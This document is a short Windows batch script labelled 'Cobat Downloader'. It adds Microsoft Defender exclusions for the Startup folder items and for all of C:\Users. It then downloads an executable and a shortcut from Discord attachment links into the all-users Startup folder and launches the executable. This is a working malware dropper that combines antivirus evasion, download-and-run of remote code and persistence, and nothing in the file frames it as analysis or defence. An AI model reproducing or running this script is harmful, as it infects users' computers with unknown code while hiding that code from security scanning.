@echo off
Title Cobat Downloader & Color 5
Powershell Add-MpPreference -ExclusionPath "'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Cobat Short.lnk'"
Powershell Add-MpPreference -ExclusionPath "'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Cobat.exe'"
Powershell Add-MpPreference -ExclusionPath "'C:\Users'"
powershell -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1284063427215626323/1284074086779060285/Cobat.exe?ex=66e54eaf&is=66e3fd2f&hm=0113abb534a65fa4cd0966a335860875859132da3d968beb07d54ad59e5c5670&' -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Cobat.exe'"
powershell -c "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1284063427215626323/1284075161993347072/Cobat_Shortcut.lnk?ex=66e54faf&is=66e3fe2f&hm=386e7c74b2a977152997fe15c677e56f27fbe2065dea2551d443ecb9f6d0bf42&' -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Cobat Short.lnk'"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Cobat.exe